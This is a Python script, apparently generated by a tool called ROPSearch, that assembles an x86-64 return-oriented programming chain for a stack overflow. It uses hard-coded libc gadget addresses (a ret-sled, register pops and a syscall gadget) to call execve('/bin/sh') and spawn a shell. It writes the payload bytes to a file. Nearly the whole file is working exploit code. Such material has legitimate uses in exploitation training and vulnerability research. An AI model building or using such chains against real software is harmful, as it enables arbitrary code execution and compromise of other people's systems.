# This script was generated automatically by the ROPSearch tool.
import os, pathlib

# Configuration options:
# Max length of each instruction sequence: 8
# Allow NULL bytes in payload: Yes
# Allow whitespace bytes in payload: No
# Ignore duplicate instruction sequence results: Yes
# Approximate byte count of stack content before saved return: 100
# Maximum number of instruction sequence variants to output for each step: 5
# Number of acceptable padding bytes for a single instruction sequence: 100

# Init the payload
payload = b''

# ROP-chain for calling: execve("/bin/sh", NULL, NULL);
# Passing NULL for the args and environment is not portable but is allowed by some Linux versions.
if True:
    # RET-sled
    payload += b'\x2F\x88\x42\xB7\xF6\x7A\x00\x00' * 23 # 0x00007af6b742882f: "ret"
    
    # Set register to system call number of execve().
    # rax = 0x000000000000003b
    if True:
        payload += b'\x37\xD2\x4D\xB7\xF6\x7A\x00\x00' # 0x00007af6b74dd237: pop rax; ret
        payload += b'\x3B\x00\x00\x00\x00\x00\x00\x00' # Value: 0x000000000000003b
        
        # payload += b'\xA0\x57\x50\xB7\xF6\x7A\x00\x00' # 0x00007af6b75057a0: pop rax; or bh, dh; ret
        # payload += b'\x3B\x00\x00\x00\x00\x00\x00\x00' # Value: 0x000000000000003b
        
        # payload += b'\xD8\x69\x50\xB7\xF6\x7A\x00\x00' # 0x00007af6b75069d8: pop rax; cmp dh, dh; ret
        # payload += b'\x3B\x00\x00\x00\x00\x00\x00\x00' # Value: 0x000000000000003b
        
        # payload += b'\xC4\x8A\x57\xB7\xF6\x7A\x00\x00' # 0x00007af6b7578ac4: pop rax; imul edi, edi, 0x5bd889ff; pop r12; pop rbp; ret
        # payload += b'\x3B\x00\x00\x00\x00\x00\x00\x00' # Value: 0x000000000000003b
        # payload += b'\xFF' * 16
        
        # payload += b'\x27\x71\x4A\xB7\xF6\x7A\x00\x00' # 0x00007af6b74a7127: pop rax; pop rbx; pop r12; pop r13; pop rbp; ret
        # payload += b'\x3B\x00\x00\x00\x00\x00\x00\x00' # Value: 0x000000000000003b
        # payload += b'\xFF' * 32
        
    # Set register to the address of "/bin/sh" in virtual memory.
    # rdi = 0x00007af6b75cb42f
    if True:
        payload += b'\x5B\xF7\x50\xB7\xF6\x7A\x00\x00' # 0x00007af6b750f75b: pop rdi; ret
        payload += b'\x2F\xB4\x5C\xB7\xF6\x7A\x00\x00' # Value: 0x00007af6b75cb42f
        
        # payload += b'\x73\xA8\x42\xB7\xF6\x7A\x00\x00' # 0x00007af6b742a873: pop rdi; pop rbp; ret
        # payload += b'\x2F\xB4\x5C\xB7\xF6\x7A\x00\x00' # Value: 0x00007af6b75cb42f
        # payload += b'\xFF' * 8
        
        # payload += b'\x48\x87\x55\xB7\xF6\x7A\x00\x00' # 0x00007af6b7558748: pop rdi; pop rbx; pop r12; pop r13; pop r14; pop rbp; ret
        # payload += b'\x2F\xB4\x5C\xB7\xF6\x7A\x00\x00' # Value: 0x00007af6b75cb42f
        # payload += b'\xFF' * 40
        
    # Set register to NULL.
    # rsi = 0x0000000000000000
    if True:
        payload += b'\x91\x5D\x52\xB7\xF6\x7A\x00\x00' # 0x00007af6b7525d91: pop rsi; ret
        payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
        
        # payload += b'\x6B\xB4\x42\xB7\xF6\x7A\x00\x00' # 0x00007af6b742b46b: pop rsi; pop rbp; ret
        # payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
        # payload += b'\xFF' * 8
        
        # payload += b'\x3C\xCF\x4F\xB7\xF6\x7A\x00\x00' # 0x00007af6b74fcf3c: pop rsi; or bh, dh; ret
        # payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
        
        # payload += b'\x59\xF7\x50\xB7\xF6\x7A\x00\x00' # 0x00007af6b750f759: pop rsi; pop r15; ret
        # payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
        # payload += b'\xFF' * 8
        
        # payload += b'\xDF\x86\x45\xB7\xF6\x7A\x00\x00' # 0x00007af6b74586df: pop rsi; add rsp, 0x10; pop rbx; ret
        # payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
        # payload += b'\xFF' * 24
        
    # Set register to NULL.
    # rdx = 0x0000000000000000 (with intermediates)
    if True:
        # rbx = 0x0000000000000000
        if True:
            payload += b'\xE4\x86\x45\xB7\xF6\x7A\x00\x00' # 0x00007af6b74586e4: pop rbx; ret
            payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
            
            # payload += b'\xC9\xF6\x54\xB7\xF6\x7A\x00\x00' # 0x00007af6b754f6c9: pop rbx; ret 0xb
            # payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
            # payload += b'\x2F\x88\x42\xB7\xF6\x7A\x00\x00' # 0x00007af6b742882f: ret
            # payload += b'\xFF' * 11
            
            # payload += b'\x3A\x4D\x51\xB7\xF6\x7A\x00\x00' # 0x00007af6b7514d3a: pop rbx; pop rbp; ret
            # payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
            # payload += b'\xFF' * 8
            
            # payload += b'\xFD\x5F\x52\xB7\xF6\x7A\x00\x00' # 0x00007af6b7525ffd: pop rbx; pop r14; pop rbp; ret
            # payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
            # payload += b'\xFF' * 16
            
            # payload += b'\x71\xA7\x42\xB7\xF6\x7A\x00\x00' # 0x00007af6b742a771: pop rbx; pop r12; pop rbp; ret
            # payload += b'\x00\x00\x00\x00\x00\x00\x00\x00' # Value: 0x0000000000000000
            # payload += b'\xFF' * 16
            
        # rdx = rbx
        if True:
            payload += b'\x33\x01\x4B\xB7\xF6\x7A\x00\x00' # 0x00007af6b74b0133: mov rdx, rbx; pop rbx; pop r12; pop rbp; ret
            payload += b'\xFF' * 24
            
    # Make the system call
    if True:
        payload += b'\xB6\x8F\x49\xB7\xF6\x7A\x00\x00' # 0x00007af6b7498fb6: syscall; ret
    
# Change the CWD of the script to its own directory.
abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

# Write the payload bytes to a file.
scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
    fout.write(payload)

